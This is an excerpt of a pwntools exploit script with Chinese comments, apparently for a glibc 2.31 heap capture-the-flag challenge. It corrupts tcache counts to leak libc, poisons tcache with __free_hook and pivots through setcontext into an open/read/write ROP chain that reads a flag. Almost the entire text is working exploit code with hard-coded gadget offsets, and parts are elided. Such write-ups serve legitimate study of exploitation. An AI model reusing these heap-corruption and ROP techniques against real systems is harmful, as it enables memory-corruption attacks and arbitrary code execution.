...
libc = ELF('/home/javayuan/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so')
...
# /home/javayuan/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64
...
# 把0x290大小的chunk->第27个count改为0x07即-1，然后就会直接进入unsorted_bin
payload = b'\x00'*0x4e + b'\07\x00'
# 这里要注意2.31的count是两个字节为一个单位，所以0x27*2=0x4e
# payload = b'\x01\x00\x02\x00\x03\x00\x04\x00\x05\x00\x06\x00'
edit(payload)
delete()
show()
ru(b'Content: ')
...
#setcontext
payload = b'\x02\x00'*0x6 + b'\x00\x00' #把0x80 tcache count变成0，其他count变成2
payload = payload + b'\x02\x00' * 0x39
payload += p64(free_hook)            #0x20 tcache填充free_hook
payload += p64(head + 0x1000) 		 #flag 0x30
payload += p64(head + 0x2000) 		 #stack 0x40
payload += p64(head + 0x20a0) 		 #stack 0x50
payload += p64(head + 0x3000) 		 #orw 0x60
payload += p64(head + 0x3000 + 0x50) #orw 0x70
...
pop_rdi_ret = libc_base + 0x023b72
pop_rdx_rbx_ret = libc_base + 0x15f7e6
pop_rsi_ret = libc_base + 0x2604f
pop_rax_ret = libc_base + 0x47400
magic_2_31_gadget = libc_base + 0x01518b0
ret = libc_base + 0x22679
read_addr = libc_base + libc.sym['read']
write_addr = libc_base + libc.sym['write']
open_addr = libc_base + libc.sym['open']
syscall_addr = libc_base + libc.sym['syscall'] + 27
#这里如果直接用syscall函数有修改栈的操作，所以要直接用syscall语句
# 实际上这里不需要是syscall函数，其他函数中的syscall语句都可以
#比如 syscall = read_addr + 15
FLAG = head + 0x1000
setcontext = libc_base + libc.sym['setcontext'] + 61 #将[rdi+0xa0[传入rsp
...
orw += p64(pop_rdx_rbx_ret) + p64(0x20) + p64(0)#长短
orw += p64(read_addr)
...
#注意看这里还要加上一个ret，原因是setcontext中会push rcx，rcx的值又是rdi+0xa8
...
add(0x38) #rsp 1
payload = p64(0) + p64(head + 0x2000) + p64(0) * 2 + p64(setcontext)
